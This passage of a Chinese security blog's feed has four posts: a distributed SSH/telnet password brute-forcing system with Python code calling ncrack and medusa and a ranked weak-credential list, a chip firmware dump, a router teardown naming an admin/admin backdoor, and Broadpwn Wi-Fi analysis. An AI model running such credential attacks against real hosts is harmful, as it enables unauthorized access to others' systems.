      <category term="QARK" scheme="http://www.future-sec.com/tags/QARK/"/>
    
  </entry>
  
  <entry>
    <title>谁是僵尸之王-如何进行高效的分布式爆破</title>
    <link href="http://www.future-sec.com/king-of-zombie.html"/>
    <id>http://www.future-sec.com/king-of-zombie.html</id>
    <published>2018-04-07T16:00:00.000Z</published>
    <updated>2018-06-29T08:59:05.620Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在研发漏洞扫描器的弱口令破解模块时，发现传统的通过字典遍历用户名密码的算法效率过低，当需要大批量高速爆破时，难以满足此类需求，因此需要引入新的算法，本文以一个分布式扫描器的爆破模块为例，演示如何进行高效快速的分布式爆破。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/6172922.jpg" alt="617292"></p>
<h2 id="传统方法"><a href="#传统方法" class="headerlink" title="传统方法"></a>传统方法</h2><p>传统的密码穷举</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/15156625175922.jpg" alt=""><br>效率非常低，而且还有可能触发报警  </p>
<h2 id="king-of-zombie"><a href="#king-of-zombie" class="headerlink" title="king of zombie"></a>king of zombie</h2><p>koz (king of zombie) 算法,即首先按照多种算法对用户名密码字典组合进行评分,然后用评分最高的组合去淘汰僵尸主机。</p>
<h3 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h3><ol>
<li>上游push ncrack任务到队列</li>
<li>koz 节点开始瓜分队列任务,保存为任务列表 (根据cpu,网速来分配多少任务) 。</li>
<li>使用账号密码字典爆破来遍历任务列表,hit中 即从列表中淘汰(字典按评分优先级排序)。</li>
</ol>
<ul>
<li>说明</li>
</ul>
<ol>
<li><p>字典评分按照爆破成功记录次数和蜜罐记录次数来计算,master 端实时更新,koz node 每日定时更新。</p>
</li>
<li><p>淘汰机制具体为先去除一大部分普遍存在的弱口令,例如某一批次中,第一次使用 ubnt/ubnt 来爆破ssh服务,就能淘汰 15% 的任务,第二次使用 root/123456 能淘汰 3% 。</p>
</li>
</ol>
<h3 id="表结构"><a href="#表结构" class="headerlink" title="表结构"></a>表结构</h3><p>pw_koz_level </p>
<table>
<thead>
<tr>
<th>列</th>
<th>类型</th>
<th>注释</th>
</tr>
</thead>
<tbody>
<tr>
<td>id</td>
<td>int(11)</td>
<td>自动增量</td>
</tr>
<tr>
<td>username</td>
<td>varchar(255)</td>
<td>用户名</td>
</tr>
<tr>
<td>password</td>
<td>varchar(255)</td>
<td>密码</td>
</tr>
<tr>
<td>type</td>
<td>varchar(255)</td>
<td>类型</td>
</tr>
<tr>
<td>score</td>
<td>int(11)</td>
<td>评分</td>
</tr>
</tbody>
</table>
<h3 id="更新算法"><a href="#更新算法" class="headerlink" title="更新算法"></a>更新算法</h3><p>目前数据来源有四个<br>第一个  扫描器爆破成功记录  score 值为 10<br>第二个  蜜罐记录   score 值 为 1<br>第三个  渗透进去提取到的有效密码(例如windows 明文)  ,score 10<br>第四个  收集的各种工具扫描字典  score 值为 1</p>
<p>扫描的时候工具score 值来排序,命中一次之后+10 </p>
<p>例如如下字典列表</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/15228255230476.jpg" alt=""></p>
<h4 id="master"><a href="#master" class="headerlink" title="master"></a>master</h4><p>推送任务之后使用无状态扫描工具扫描服务和指纹识别</p>
<h4 id="koz-node"><a href="#koz-node" class="headerlink" title="koz node"></a>koz node</h4><p>KozTask 类来保存本地任务队列,接收处的代码为</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span>  <span class="title">pop_member</span><span class="params">(self)</span>:</span></div><div class="line">    <span class="keyword">while</span> self.len() &gt;  <span class="number">0</span>:</div><div class="line">        str_member=self.pop()</div><div class="line">        koz_member=ast.literal_eval(str_member)</div><div class="line">        self.list_member[str(koz_member[<span class="string">'name'</span>])].append(koz_member)</div><div class="line">    util.log(<span class="string">"pop koz_member  done count:%d"</span>  % (self.count()),<span class="number">2</span>,<span class="string">'koztask'</span>)</div></pre></td></tr></table></figure>
<p>本地队列处理完毕之后,开始foreach 循环用户名密码组合(根据score 大小优先级)</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">koz_levels=get_koz_level()</div><div class="line"><span class="keyword">for</span> koz_level  <span class="keyword">in</span>  koz_levels :</div><div class="line">    koz_queue.queue.clear()</div><div class="line">    <span class="comment">#member=&#123;'name': 'ssh', 'task_id': 1124, 'url': '', 'host': '168.167.45.250', 'version': '', 'type': 'service', 'port': 22&#125;</span></div><div class="line">    <span class="comment">#ncrack.scan(member,koz_level)</span></div><div class="line">    <span class="comment">#break</span></div><div class="line">    <span class="keyword">try</span> :</div><div class="line">        <span class="keyword">for</span> member  <span class="keyword">in</span>   koz_task.list_member[koz_level[<span class="string">'type'</span>]] :</div><div class="line">            koz_queue.put(&#123;<span class="string">'member'</span>:member,<span class="string">'level'</span>:koz_level&#125;)</div><div class="line"></div><div class="line">        work_manager = WorkManager(koz_queue, config.koz_thread)  <span class="comment"># thread</span></div><div class="line">        work_manager.wait_allcomplete()</div><div class="line">    <span class="keyword">except</span> Exception, e:</div><div class="line">        util.log(<span class="string">"error info:"</span>+str(e),<span class="number">3</span>,<span class="string">'koz_node'</span>)</div><div class="line">    util.log(<span class="string">'koz_member len:%d'</span> % (koz_task.count()),<span class="number">1</span>,<span class="string">'koz_node'</span>)</div></pre></td></tr></table></figure>
<p>当扫描出来结果时,直接把它从 koz_member 队列里面remove 掉,如此循环往复,直到跑完所有的密码。<br>remove </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></div><div class="line">    <span class="keyword">while</span>  <span class="number">1</span>:</div><div class="line">        <span class="keyword">if</span> self.work_queue.empty() == <span class="keyword">True</span>:</div><div class="line">            <span class="keyword">break</span></div><div class="line">        task = self.work_queue.get(block=<span class="keyword">False</span>)</div><div class="line">        <span class="keyword">if</span> ncrack.scan(task[<span class="string">'member'</span>],task[<span class="string">'level'</span>])  != <span class="keyword">False</span> :</div><div class="line">            koz_type=task[<span class="string">'member'</span>][<span class="string">'name'</span>]</div><div class="line">            koz_task.list_member[koz_type].remove(task[<span class="string">'member'</span>])</div></pre></td></tr></table></figure>
<h3 id="爆破算法"><a href="#爆破算法" class="headerlink" title="爆破算法"></a>爆破算法</h3><p>负责爆破的为ncrack 模块,调用的爆破工具有  medusa,ncrack。<br>部分实现</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span><span class="params">(target,level)</span>:</span></div><div class="line">    <span class="keyword">if</span> target[<span class="string">'name'</span>]  == <span class="string">'ms-wbt-server'</span>  <span class="keyword">or</span>  target[<span class="string">'name'</span>]  == <span class="string">'telnet'</span> :</div><div class="line">        str_command = <span class="string">"ncrack --user %s --pass %s  %s:%d "</span>  %  (level[<span class="string">'username'</span>],level[<span class="string">'password'</span>],target[<span class="string">'host'</span>],target[<span class="string">'port'</span>])</div><div class="line">        str_ret=str(sys_exec([<span class="string">'ncrack'</span>, <span class="string">'--user'</span>,level[<span class="string">'username'</span>], <span class="string">'--pass'</span>, level[<span class="string">'password'</span>], target[<span class="string">'host'</span>]+<span class="string">':'</span>+ str(target[<span class="string">'port'</span>])]))</div><div class="line">    <span class="keyword">else</span> :</div><div class="line">        str_command = <span class="string">"medusa -u %s -p %s -h %s -n %d  -M %s"</span> % (level[<span class="string">'username'</span>], level[<span class="string">'password'</span>], target[<span class="string">'host'</span>], target[<span class="string">'port'</span>], target[<span class="string">'name'</span>])</div><div class="line">        str_ret=str(sys_exec([<span class="string">'medusa'</span>,<span class="string">'-u'</span>,level[<span class="string">'username'</span>],<span class="string">'-p'</span>,level[<span class="string">'password'</span>],<span class="string">'-h'</span>,target[<span class="string">'host'</span>],<span class="string">'-n'</span>,str(target[<span class="string">'port'</span>]),<span class="string">'-M'</span>,target[<span class="string">'name'</span>]]))</div><div class="line">    </div><div class="line">    util.log(str_command, <span class="number">2</span>, <span class="string">'ncrack'</span>)</div><div class="line">    <span class="comment">#need  change </span></div><div class="line">    <span class="keyword">if</span> <span class="string">'ACCOUNT FOUND'</span> <span class="keyword">in</span> str_ret  <span class="keyword">or</span>  <span class="string">'credentials'</span>  <span class="keyword">in</span> str_ret:</div><div class="line">        str_data=<span class="string">'[%s] %s %s:%s'</span>   %  (target[<span class="string">'name'</span>],target[<span class="string">'host'</span>],level[<span class="string">'username'</span>],level[<span class="string">'password'</span>])</div><div class="line">        util.log(<span class="string">'ncrack taskid:%d target:%s service:%s succeed'</span> % (target[<span class="string">'task_id'</span>], target[<span class="string">'host'</span>], target[<span class="string">'name'</span>]), <span class="number">1</span>, <span class="string">'ncrack'</span>)</div><div class="line">        <span class="keyword">return</span> report(target,str_data)</div><div class="line">        </div><div class="line">    <span class="keyword">else</span>  :</div><div class="line">        <span class="keyword">return</span> <span class="keyword">False</span></div></pre></td></tr></table></figure>
<h3 id="爆破结果"><a href="#爆破结果" class="headerlink" title="爆破结果"></a>爆破结果</h3><p> 总览<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/14703046762519.png" alt=""></p>
<p>图文分析</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/14703047183607.jpg" alt=""></p>
<p>部分结果一览</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/147030475970560.jpg" alt="147030475970560"></p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;在研发漏洞扫描器的弱口令破解模块时，发现传统的通过字典遍历用户名密码的算法效率过低，当需要大批量高速爆破时，难以满足此类需求，因此需要引入新
    
    </summary>
    
      <category term="web安全" scheme="http://www.future-sec.com/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="密码爆破" scheme="http://www.future-sec.com/tags/%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4/"/>
    
  </entry>
  
  <entry>
    <title>芯片安全系列-Let&#39;s cook!</title>
    <link href="http://www.future-sec.com/chip-security-let-us-cook.html"/>
    <id>http://www.future-sec.com/chip-security-let-us-cook.html</id>
    <published>2018-01-20T16:00:00.000Z</published>
    <updated>2018-06-29T08:59:11.900Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>芯片安全是针对芯片本身的安全研究，其在知识产权保护，防抄板山寨、加密破解、优化设计、漏洞挖掘和芯片木马等方面都具有深远意义，传统安全往往着眼于上层应用和驱动层面的安全，然而如果芯片存在本质的设计缺陷或安全漏洞，传统安全手段往往很难触及底层，前段时间英特尔芯片的“崩溃”（Meltdown）和“幽灵”（Spectre）漏洞，轰动整个世界，造成了巨额的损失，此次漏洞爆发就是因为芯片自身的设计缺陷所导致的，芯片级的安全研究是一项长期而艰难的工作，其是一门涉及多学科多门类的综合性研究，包括：微电子学、计算机科学、数学、物理学、化学、电磁学、光学等等。芯片分析方式主要包括非侵入式、半侵入式、侵入式、侧信道等。本文通过对某款蓝牙锁芯片的处理和固件提取，作为芯片分析的简单实例。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/dfghfghfhg.jpg" alt="dfghfghfhg"></p>
<h2 id="拆焊"><a href="#拆焊" class="headerlink" title="拆焊"></a>拆焊</h2><p>在PCB背面有一颗CC2541的蓝牙芯片，此款芯片采用QFN-40封装格式，没有暴露的可以直连外部引脚，厂商在量产时也把调试接口去掉了，为了获取芯片的固件内容，需要进行拆焊。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/fghgjty555.jpg" alt="fghgjty555"></p>
<p>拆焊所需工具包括：热风枪、焊枪、松香水、吸锡线、洗板水或无水酒精、无纺布、镊子等。热风枪温度调到360度，风速在5档左右，先在距离PCb上方3到5厘米处，给PCB预热几秒，然后缓缓下移到1厘米处，沿着芯片的四周匀速转动，枪口务必不要对准芯片的中心处，防止芯片过热，造成损毁，大概20秒左右即可融化芯片底部焊锡，另一只手用镊子夹住芯片，轻轻往上一提，芯片即可从PCB取下。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/20180116_134552.jpg" alt="20180116_134552"><br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/20180116_134549.jpg" alt="20180116_134549"></p>
<h2 id="清洁"><a href="#清洁" class="headerlink" title="清洁"></a>清洁</h2><p>取下芯片之后，芯片的底部会粘有很多未去除的焊锡和脏物，需要进一步清洁处理，首先滴上松香水，用焊枪使焊锡融化。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/20180116_134618.jpg" alt="20180116_134618"></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/20180116_134719.jpg" alt="20180116_134719"></p>
<p>然后用吸锡线配合焊枪把多余的焊锡和脏物吸掉，反复几次。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/20180116_134735.jpg" alt="20180116_134735"></p>
<p>处理完毕之后，用洗板水和无纺布擦洗芯片，彻底去除脏物残留，引脚应保持光亮，以防接触不良和短路。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/20180116_134815.jpg" alt="20180116_134815"></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/20180116_134845.jpg" alt="20180116_134845"></p>
<p>焊锡、松香水和洗板水气味比较刺鼻，高温易伤手，工作环境需要注意通风，有条件可以配置防护服。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/breaking-bad-heisenberg-jesse-hazmat-suit-combo-sixth-scale-threezero-902883-28.jpg" alt="breaking-bad-heisenberg-jesse-hazmat-suit-combo-sixth-scale-threezero-902883-28"></p>
<h2 id="芯片读取"><a href="#芯片读取" class="headerlink" title="芯片读取"></a>芯片读取</h2><p>CC2541芯片是TI出品的一款蓝牙芯片，TI有专门的工具和软件来读取，包括：CCDebugger调试器和SmartRF Flash Programmer软件，因芯片已经拆下，可以通过转接板或烧录座连接芯片，引出相应的接口，然后连接CCDebugger进行固件的读取。</p>
<p>把处理好的芯片放入烧录座，需要正确放置芯片，可以通过芯片正面的小圆点确定方向。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/20180116_134912.jpg" alt="20180116_134912"></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/20180116_135324.jpg" alt="20180116_135324"></p>
<p>确认无误之后，压紧烧录座盖，连上CCDebugger。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/20180116_135403.jpg" alt="20180116_135403"></p>
<p>打开SmartRF Flash Programmer，选择Read flash into hex-file选项，在Flash image选项可以选择保存的路径和文件名，然后点Perform actions，即可开始读取。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/20180116135409.jpg" alt="QQ截图20180116135409"></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/20180116135434.jpg" alt="QQ截图20180116135434"></p>
<p>读取的文件格式为HEX，然后根据对应的CPU指令编写进行反汇编。   </p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/78B82770-AB46-4404-B195-2B28835DF2AC.jpg" alt="QQ截图20180116135452"></p>
<p>部分芯片另需进行开片和晶体电路修改等等深度处理，本文是伏宸实验室关于芯片安全的一篇先导性文章，后续将会有一系列关于芯片安全的文章，敬请期待。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;芯片安全是针对芯片本身的安全研究，其在知识产权保护，防抄板山寨、加密破解、优化设计、漏洞挖掘和芯片木马等方面都具有深远意义，传统安全往往着眼
    
    </summary>
    
      <category term="芯片安全" scheme="http://www.future-sec.com/categories/%E8%8A%AF%E7%89%87%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="芯片安全" scheme="http://www.future-sec.com/tags/%E8%8A%AF%E7%89%87%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>某4G无线路由终端分析</title>
    <link href="http://www.future-sec.com/analysis-of-a-4G-wireless-router.html"/>
    <id>http://www.future-sec.com/analysis-of-a-4G-wireless-router.html</id>
    <published>2018-01-19T16:00:00.000Z</published>
    <updated>2018-06-29T08:59:12.972Z</updated>
    
    <content type="html"><![CDATA[<h2 id="设备介绍"><a href="#设备介绍" class="headerlink" title="设备介绍"></a>设备介绍</h2><p>随着4G网络的大区域覆盖，移动端的网络速度得到大幅提升，此次分析的该款4G无线路由终端，就是通过sim卡连上LTE网络之后，在通过wifi模块将蜂窝网络转为wifi信号共享给其他设备使用，其原理与手机共享热点类似，因其便携省电等功能，目前在市场上的反响颇高，X宝销量达数万件。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/1224171902.jpg" alt="1224171902"><br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/20171219164331.jpg" alt="QQ截图20171219164331"></p>
<h2 id="硬件分析"><a href="#硬件分析" class="headerlink" title="硬件分析"></a>硬件分析</h2><p>话不多说，进入正题，拆掉背面螺丝，取出电池，揭掉正面盖板，在正面PCB上是一块全彩TFT屏幕，显示效果一般，屏幕下方有多个印字。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/1224171903.jpg" alt="1224171903"></p>
<p>左侧有两个焊点，分别是RXD和TXD口，可以通过UART模式调试。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/1224171903a.jpg" alt="1224171903a"></p>
<p>下方左侧是8口的JTAG调试口，加一个公用GND口，JTAG调试下篇会重点介绍。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/1224171903b.jpg" alt="1224171903b"></p>
<p>正下方靠近USB充电口位置是电源电压测试口，主要用来测量额定输入输出的电源电压。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/1224171903c.jpg" alt="1224171903c"></p>
<p>拆掉PCB上的螺丝，翻转板子，背面包括SIM插槽、SD卡插槽以及核心处理芯片，出于保护和散热的目的，还加装了保护盖。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/1224171904.jpg" alt="1224171904"></p>
<p>拆掉盖子，先看下主要芯片的型号和用途，这对进一步分析有很大帮助。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/1224171905-bianhao.jpg" alt="1224171905-bianhao"></p>
<p>图上标注1的芯片通过查看印字分析,为芯天下出产的PN26Q01AWSIUG 型存储芯片，存储容量为1G。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/20171218_191431.jpg" alt="20171218_191431"></p>
<p>标注2的芯片为中兴微电子生产的ZX297520型手机modem芯片，支持TD-LTE/FDD LTE /WCDMA/TD-SCDMA/EDGE全模制式。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/20171218_191405.jpg" alt="20171218_191405"></p>
<p>标注3的芯片为Realtek生产的使用非常广泛的RTL8189ES无线wifi芯片，是一款高性能、低功耗、体积小SDIO接口无线模组。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/20171218_191336.jpg" alt="20171218_191336"></p>
<p>标注4的芯片为中兴微电子生产的ZX23422电源管理芯片。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/20171218_191524.jpg" alt="20171218_191524"></p>
<p>标注5的芯片为锐迪科（RDA）生产的RPM6743射频前端芯片，是蜂窝网络和wifi信号广播收发的重要组成部分。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/20171218_191505.jpg" alt="20171218_191505"></p>
<h2 id="串口调试"><a href="#串口调试" class="headerlink" title="串口调试"></a>串口调试</h2><p>在认识设备的基本构成之后，重新组装好，首先通过正面的UART调试串口来进行初步调试，采用夹具连接RXD、TXD两个调试点，在设备通电情况下，只需把转接板上的GND口与板子上的公用GND口相连即可。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/image89.jpg" alt="image89"></p>
<p>因串口输出信息过多，影响观察输入和输出结果，因此采用串口调试助手，设置波特率为115200，输入命令并发送，可以成功执行。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/image90.jpg" alt="image90"></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/image91.jpg" alt="image91"></p>
<h2 id="初步分析"><a href="#初步分析" class="headerlink" title="初步分析"></a>初步分析</h2><p>查看当前进程，通过串口输出信息，发现该终端采用goahead作为web服务器，4719端口存在一个telnet服务。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/hgjghjtyut.jpg" alt="命令"></p>
<p>连接wifi进入web管理界面，查看设备ip。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/15136011800782.jpg" alt="15136011800782"></p>
<p>通过telnet连接设备，使用弱口令弱口令：admin、admin即可登录。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/15136011175389.jpg" alt="15136011175389"></p>
<p>该账号为后门账号。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/15136012728967.jpg" alt="15136012728967">查看开启的端口。</p>
<p>如果需要继续分析，可以通过tftp 传输文件至本地，例如/bin/goahead。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;设备介绍&quot;&gt;&lt;a href=&quot;#设备介绍&quot; class=&quot;headerlink&quot; title=&quot;设备介绍&quot;&gt;&lt;/a&gt;设备介绍&lt;/h2&gt;&lt;p&gt;随着4G网络的大区域覆盖，移动端的网络速度得到大幅提升，此次分析的该款4G无线路由终端，就是通过sim卡连上LTE网络之后，
    
    </summary>
    
      <category term="硬件安全" scheme="http://www.future-sec.com/categories/%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="硬件安全" scheme="http://www.future-sec.com/tags/%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>BROADCOM WI-FI芯片漏洞分析三</title>
    <link href="http://www.future-sec.com/broadcom-wifi-3.html"/>
    <id>http://www.future-sec.com/broadcom-wifi-3.html</id>
    <published>2018-01-18T16:00:00.000Z</published>
    <updated>2018-06-29T08:59:12.388Z</updated>
    
    <content type="html"><![CDATA[<h2 id="切入点"><a href="#切入点" class="headerlink" title="切入点"></a>切入点</h2><p>从解析wme信标帧开始<br>参考：<a href="http://www.freebuf.com/vuls/142099.html" rel="external nofollow noopener noreferrer" target="_blank">freebuf博客：完整解析博通WiFi芯片Broadpwn漏洞</a><br>先找到固件中的漏洞位置，如下代码所示，有几个关键的数据帧标志类型。根据管理帧的类型在 VMG-1312 的源代码定位到处理这部分管理帧数据包的代码。</p>
<figure class="highlight sqf"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line">frame_type = *(unsigned <span class="variable">__int16</span> *)(arg + <span class="number">8</span>);  <span class="comment">// arg-&gt;frame_type</span></div><div class="line">  cfg = *(<span class="variable">_DWORD</span> *)(arg + <span class="number">4</span>);                   <span class="comment">// arg-&gt;bsscfg</span></div><div class="line">  v4 = wlc;</div><div class="line">  ie = *(<span class="variable">_DWORD</span> *)(arg + <span class="number">0</span>xC);                  <span class="comment">// arg-&gt;ie</span></div><div class="line">  current_wmm_ie = *(<span class="variable">_BYTE</span> **)(cfg + <span class="number">0</span>x354);    <span class="comment">// cfg-&gt;current_wmm_ie</span></div><div class="line">  <span class="keyword">if</span> ( frame_type == <span class="number">0</span>x20 )                     <span class="comment">// FC_REASSOC_REQ = 0x20 重新关联请求帧</span></div><div class="line">    <span class="built_in">goto</span> LABEL_9;</div><div class="line">  <span class="keyword">if</span> ( frame_type &lt;= <span class="number">0</span>x20 )</div><div class="line">  &#123;</div><div class="line">    <span class="keyword">if</span> ( *(<span class="variable">_WORD</span> *)(arg + <span class="number">8</span>) )</div><div class="line">    &#123;</div><div class="line">      <span class="keyword">if</span> ( frame_type != <span class="number">0</span>x10 )                 <span class="comment">// FC_ASSOC_RESP  = 0x10  //关联帧 </span></div><div class="line">        return <span class="number">0</span>;</div><div class="line">      <span class="built_in">goto</span> LABEL_15;</div><div class="line">    &#125;</div><div class="line">    ...</div><div class="line">    ...</div><div class="line">    ...</div><div class="line">    <span class="keyword">if</span> ( frame_type != <span class="number">0</span>x30 )                     <span class="comment">// FC_REASSOC_RESP = 0x30 重新关联响应帧</span></div><div class="line">  &#123;</div><div class="line">    <span class="keyword">if</span> ( frame_type == <span class="number">0</span>x80 )                   <span class="comment">// FC_BEACON = 0x80 信标帧</span></div><div class="line">    &#123;</div><div class="line">      v16 = **(<span class="variable">_DWORD</span> **)(*(<span class="variable">_DWORD</span> *)arg + <span class="number">0</span>x1C);</div><div class="line">      <span class="keyword">if</span> ( *(<span class="variable">_DWORD</span> *)(*(<span class="variable">_DWORD</span> *)wlc + <span class="number">0</span>x34) )</div><div class="line">      ...</div><div class="line">      ...</div><div class="line">      ...</div></pre></td></tr></table></figure>
<h2 id="Wlan知识普及"><a href="#Wlan知识普及" class="headerlink" title="Wlan知识普及"></a>Wlan知识普及</h2><p>1）802.11数据包类型</p>
<figure class="highlight vbscript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="number">1.</span> 数据: 数据数据包的作用是用来携带更高层次的数据(如IP数据包，ISO7层协议)。</div><div class="line">它负责在工作站之间传输数据</div><div class="line"></div><div class="line"><span class="number">2.</span> 管理: 管理数据包控制网络的管理功能</div><div class="line">    <span class="number">1</span>) 信标帧(Beacons): 在无线设备中，定时依次按指定间隔发送的有规律的无线信号(类似心跳包)，主要用于定位和同步使用</div><div class="line">    <span class="number">2</span>) 解除认证(Deauthentication)数据包 </div><div class="line">    <span class="number">3</span>) Probe(<span class="built_in">request</span> <span class="keyword">and</span> <span class="built_in">response</span>)探测包</div><div class="line">    <span class="number">4</span>) Authenticate(<span class="built_in">request</span> <span class="keyword">and</span> <span class="built_in">response</span>)身份认证</div><div class="line">    <span class="number">5</span>) Associate(<span class="built_in">request</span> <span class="keyword">and</span> <span class="built_in">response</span>)关联</div><div class="line">    <span class="number">6</span>) Reassociate(<span class="built_in">request</span> <span class="keyword">and</span> <span class="built_in">response</span>)重新关联</div><div class="line">    <span class="number">7</span>) Dissassociate(notify) 解除关联</div><div class="line">管理帧负责监督，主要用来加入或退出无线网络，以及处理接入点之间连接的转移事宜</div><div class="line"></div><div class="line"><span class="number">3.</span> 控制: 控制数据包得名于术语<span class="string">"媒体接入控制(Media Access Control, MAC)"</span>，是用来控制对共享媒体(即物理媒介，如光缆)的访问</div><div class="line">    <span class="number">1</span>) 请求发送(<span class="built_in">Request</span> <span class="keyword">To</span> Send，RTS)数据包</div><div class="line">    <span class="number">2</span>) 清除发送(Clear <span class="keyword">To</span> Send，CTS)数据包</div><div class="line">    <span class="number">3</span>) ACK确认(RTS/CTS)  </div><div class="line">    <span class="number">4</span>) PS-Poll: 当一部移动工作站从省电模式中苏醒，便会发送一个 PS-Poll 帧给基站，以取得任何暂存帧 </div><div class="line">控制帧通常与数据帧搭配使用，负责区域的清空、信道的取得以及载波监听的维护，并于收到数据时予以正面的应答，借此促进工作站间数据传输的可靠性</div></pre></td></tr></table></figure>
